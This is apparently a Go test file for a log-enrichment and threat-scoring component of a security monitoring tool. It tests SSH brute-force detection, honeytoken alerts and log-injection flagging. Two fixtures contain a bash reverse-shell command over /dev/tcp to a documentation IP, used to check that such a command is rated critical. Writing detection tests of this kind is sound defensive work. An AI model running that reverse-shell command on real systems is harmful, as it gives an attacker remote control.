package enrich

import (
	"strings"
	"testing"

	"github.com/TheRealArron/sentinel-rag/ingestor/internal/event"
	"github.com/TheRealArron/sentinel-rag/ingestor/internal/honeytoken"
	"github.com/TheRealArron/sentinel-rag/ingestor/internal/parser"
	"github.com/TheRealArron/sentinel-rag/ingestor/internal/sanitize"
)

// enrichLine runs the real path a line takes: sanitize -> parse -> enrich.
func enrichLine(t *testing.T, line string) *event.Event {
	t.Helper()
	san := sanitize.Line(line, 0)
	env := parser.Parse(san.Clean)
	ev := &event.Event{
		Host:    env.Host,
		Process: env.Process,
		PID:     env.PID,
		Message: env.Message,
	}
	Apply(ev, env, san, nil)
	return ev
}

func TestSSHFailedPasswordExtraction(t *testing.T) {
	ev := enrichLine(t, "Jul 30 05:30:12 sentinel sshd[4021]: Failed password for invalid user admin from 203.0.113.45 port 51234 ssh2")

	if ev.Rule != "ssh_failed_password" {
		t.Fatalf("Rule = %q, want ssh_failed_password", ev.Rule)
	}
	if ev.User != "admin" || ev.SourceIP != "203.0.113.45" || ev.SourcePort != 51234 {
		t.Errorf("user/ip/port = %q/%q/%d", ev.User, ev.SourceIP, ev.SourcePort)
	}
	if ev.Category != CatAuth || ev.Outcome != "failure" {
		t.Errorf("category/outcome = %q/%q", ev.Category, ev.Outcome)
	}
	if !hasTag(ev, "ブルートフォース") {
		t.Errorf("missing Japanese bridge tag, got %v", ev.Tags)
	}
	// Base 46 + public source 8 = 54 -> warning.
	if ev.Severity != event.SeverityWarning {
		t.Errorf("Severity = %q (score %d), want warning", ev.Severity, ev.Score)
	}
}

func TestPublicSourceScoresAbovePrivate(t *testing.T) {
	pub := enrichLine(t, "Jul 30 05:30:12 h sshd[1]: Failed password for root from 203.0.113.45 port 22 ssh2")
	priv := enrichLine(t, "Jul 30 05:30:12 h sshd[1]: Failed password for root from 192.168.1.50 port 22 ssh2")
	if pub.Score <= priv.Score {
		t.Errorf("public score %d should exceed private score %d", pub.Score, priv.Score)
	}
	if Scope("203.0.113.45") != "public" || Scope("192.168.1.50") != "private" || Scope("127.0.0.1") != "loopback" {
		t.Error("Scope classification wrong")
	}
}

func TestRootInvolvementRaisesScore(t *testing.T) {
	root := enrichLine(t, "Jul 30 05:30:12 h sudo[1]: alice : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash")
	other := enrichLine(t, "Jul 30 05:30:12 h sudo[1]: alice : TTY=pts/0 ; PWD=/tmp ; USER=bob ; COMMAND=/bin/bash")
	if root.Score <= other.Score {
		t.Errorf("root target score %d should exceed non-root %d", root.Score, other.Score)
	}
	if root.Fields["command"] != "/bin/bash" || root.Fields["target_user"] != "root" {
		t.Errorf("captures = %v", root.Fields)
	}
}

func TestReverseShellIsCritical(t *testing.T) {
	ev := enrichLine(t, "Jul 30 05:31:00 h bash[900]: arron : COMMAND=/bin/bash -i >& /dev/tcp/203.0.113.9/4444 0>&1")
	if ev.Severity != event.SeverityCritical {
		t.Fatalf("Severity = %q (score %d), want critical", ev.Severity, ev.Score)
	}
	if !hasMITRE(ev, "T1059.004") {
		t.Errorf("MITRE = %v, want T1059.004", ev.MITRE)
	}
}

func TestUFWBlockExtraction(t *testing.T) {
	ev := enrichLine(t, "Jul 30 05:32:00 h kernel: [UFW BLOCK] IN=eth0 OUT= MAC=aa:bb SRC=203.0.113.9 DST=10.0.0.5 LEN=60 PROTO=TCP SPT=44321 DPT=23 WINDOW=1024")
	if ev.Rule != "ufw_block" {
		t.Fatalf("Rule = %q, want ufw_block", ev.Rule)
	}
	if ev.SourceIP != "203.0.113.9" || ev.DestIP != "10.0.0.5" || ev.DestPort != 23 {
		t.Errorf("src/dst/dport = %q/%q/%d", ev.SourceIP, ev.DestIP, ev.DestPort)
	}
	if ev.Fields["proto"] != "TCP" {
		t.Errorf("proto = %q", ev.Fields["proto"])
	}
}

func TestLogInjectionAttemptIsItselfADetection(t *testing.T) {
	raw := "Jul 30 05:30:12 h sshd[1]: Invalid user admin\nJul 30 05:30:13 h sshd[1]: Accepted password for root from 1.2.3.4 port 22 from 203.0.113.45"
	ev := enrichLine(t, raw)

	if ev.Category != CatEvasion {
		t.Errorf("Category = %q, want %q", ev.Category, CatEvasion)
	}
	if !hasTag(ev, "log-injection") || !hasTag(ev, "ログインジェクション") {
		t.Errorf("missing log-injection tags: %v", ev.Tags)
	}
	if ev.Fields["score_log_injection_indicator"] == "" {
		t.Errorf("injection score modifier not recorded: %v", ev.Fields)
	}
}

func TestScoreModifiersAreExplainable(t *testing.T) {
	ev := enrichLine(t, "Jul 30 05:30:12 h sshd[1]: Failed password for root from 203.0.113.45 port 22 ssh2")
	var found []string
	for k := range ev.Fields {
		if strings.HasPrefix(k, "score_") {
			found = append(found, k)
		}
	}
	if len(found) == 0 {
		t.Fatal("no score_* explanation fields recorded")
	}
}

func TestUnknownLineStillGetsEntities(t *testing.T) {
	ev := enrichLine(t, "some novel appliance format src 198.51.100.22 said hello")
	if ev.SourceIP != "198.51.100.22" {
		t.Errorf("SourceIP = %q, want 198.51.100.22", ev.SourceIP)
	}
	if ev.Category != CatUnknown {
		t.Errorf("Category = %q, want %q", ev.Category, CatUnknown)
	}
	if !hasTag(ev, "unparsed") {
		t.Errorf("missing unparsed tag: %v", ev.Tags)
	}
}

func TestScoreAlwaysClamped(t *testing.T) {
	// Reverse shell (96) + public source (8) + root (10) + injection (25) would
	// overflow past 100 without clamping.
	ev := enrichLine(t, "Jul 30 05:30:12 h sshd[1]: root ran bash -i >& /dev/tcp/203.0.113.9/4444\x00")
	if ev.Score > 100 || ev.Score < 0 {
		t.Fatalf("Score = %d, want 0..100", ev.Score)
	}
	if ev.Severity != event.SeverityFor(ev.Score) {
		t.Errorf("Severity %q inconsistent with score %d", ev.Severity, ev.Score)
	}
}

func TestEveryRuleCompilesAndIsNamed(t *testing.T) {
	seen := map[string]bool{}
	for _, r := range Rules() {
		if r.Name == "" {
			t.Error("rule with empty name")
		}
		if seen[r.Name] {
			t.Errorf("duplicate rule name %q", r.Name)
		}
		seen[r.Name] = true
		if r.Pattern == nil {
			t.Errorf("rule %q has nil pattern", r.Name)
		}
		if r.Score < 0 || r.Score > 100 {
			t.Errorf("rule %q score %d out of range", r.Name, r.Score)
		}
		if r.Category == "" {
			t.Errorf("rule %q has no category", r.Name)
		}
	}
}

func hasTag(ev *event.Event, tag string) bool {
	for _, t := range ev.Tags {
		if t == tag {
			return true
		}
	}
	return false
}

func hasMITRE(ev *event.Event, id string) bool {
	for _, m := range ev.MITRE {
		if m == id {
			return true
		}
	}
	return false
}

// --- honeytokens (Phase 5) --------------------------------------------------

func honeySet(t *testing.T) *honeytoken.Set {
	t.Helper()
	set, err := honeytoken.New(honeytoken.Config{
		Users: []honeytoken.Entry{{Value: "admin_backup", Note: "canary"}},
		Paths: []honeytoken.Entry{{Value: "/etc/.backup_credentials"}},
	})
	if err != nil {
		t.Fatalf("honeytoken.New: %v", err)
	}
	return set
}

func enrichWithHoney(t *testing.T, line string) *event.Event {
	t.Helper()
	san := sanitize.Line(line, 0)
	env := parser.Parse(san.Clean)
	ev := &event.Event{Host: env.Host, Process: env.Process, PID: env.PID, Message: env.Message}
	Apply(ev, env, san, honeySet(t))
	return ev
}

func TestHoneytokenForcesScore100(t *testing.T) {
	// A failed password normally scores 54. Against a canary it is 100 — the
	// only single event in the system that clears the score-90 firewall
	// threshold without correlation.
	ev := enrichWithHoney(t, "Jul 30 05:30:12 h sshd[1]: Failed password for invalid user admin_backup from 203.0.113.45 port 51001 ssh2")

	if ev.Score != 100 {
		t.Fatalf("Score = %d, want 100", ev.Score)
	}
	if ev.Severity != event.SeverityCritical {
		t.Errorf("Severity = %q, want critical", ev.Severity)
	}
	if ev.Rule != "honeytoken_referenced" || ev.Category != CatDeception {
		t.Errorf("rule/category = %q/%q", ev.Rule, ev.Category)
	}
	if ev.Fields["honeytoken"] != "admin_backup" {
		t.Errorf("honeytoken field = %q", ev.Fields["honeytoken"])
	}
	if ev.Fields["honeytoken_note"] != "canary" {
		t.Errorf("note = %q", ev.Fields["honeytoken_note"])
	}
}

func TestHoneytokenPreservesHowTheCanaryWasTouched(t *testing.T) {
	// The rules still run, so the alert says the canary was hit via an SSH
	// password failure rather than merely that it was hit.
	ev := enrichWithHoney(t, "Jul 30 05:30:12 h sshd[1]: Failed password for invalid user admin_backup from 203.0.113.45 port 51001 ssh2")

	if ev.Fields["trigger_rule"] != "ssh_failed_password" {
		t.Errorf("trigger_rule = %q, want ssh_failed_password", ev.Fields["trigger_rule"])
	}
	if ev.SourceIP != "203.0.113.45" || ev.SourcePort != 51001 {
		t.Errorf("entities lost: ip=%q port=%d", ev.SourceIP, ev.SourcePort)
	}
	if !hasTag(ev, "brute-force") {
		t.Error("rule tags were discarded")
	}
}

func TestHoneytokenTagsAreBilingual(t *testing.T) {
	ev := enrichWithHoney(t, "Jul 30 05:30:12 h sshd[1]: Failed password for admin_backup from 203.0.113.45 port 22 ssh2")
	for _, tag := range []string{"honeytoken", "ハニートークン", "deception", "canary", "カナリア"} {
		if !hasTag(ev, tag) {
			t.Errorf("missing tag %q in %v", tag, ev.Tags)
		}
	}
	if !hasMITRE(ev, "T1087.001") {
		t.Errorf("MITRE = %v, want T1087.001", ev.MITRE)
	}
}

func TestHoneytokenPathAddsFileDiscoveryTechnique(t *testing.T) {
	ev := enrichWithHoney(t, "Jul 30 05:30:12 h sudo[1]: arron : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/.backup_credentials")
	if ev.Score != 100 {
		t.Fatalf("Score = %d, want 100", ev.Score)
	}
	if !hasMITRE(ev, "T1083") {
		t.Errorf("MITRE = %v, want T1083 for a path canary", ev.MITRE)
	}
}

func TestHoneytokenScoreIsExplainable(t *testing.T) {
	ev := enrichWithHoney(t, "Jul 30 05:30:12 h sshd[1]: Failed password for admin_backup from 203.0.113.45 port 22 ssh2")
	if ev.Fields["score_honeytoken"] != "=100" {
		t.Errorf("score_honeytoken = %q, want =100 (a set, not an increment)", ev.Fields["score_honeytoken"])
	}
}

func TestOrdinaryTrafficIsUnaffectedByAnArmedSet(t *testing.T) {
	// Arming honeytokens must not change the verdict on anything else.
	line := "Jul 30 05:30:12 h sshd[1]: Failed password for root from 203.0.113.45 port 22 ssh2"
	withSet := enrichWithHoney(t, line)
	without := enrichLine(t, line)

	if withSet.Score != without.Score || withSet.Rule != without.Rule || withSet.Category != without.Category {
		t.Errorf("armed set changed a non-canary event: %d/%q/%q vs %d/%q/%q",
			withSet.Score, withSet.Rule, withSet.Category,
			without.Score, without.Rule, without.Category)
	}
}

func TestNilHoneytokenSetIsInert(t *testing.T) {
	ev := enrichLine(t, "Jul 30 05:30:12 h sshd[1]: Failed password for admin_backup from 203.0.113.45 port 22 ssh2")
	if ev.Rule == "honeytoken_referenced" {
		t.Error("honeytoken fired with a nil set")
	}
}
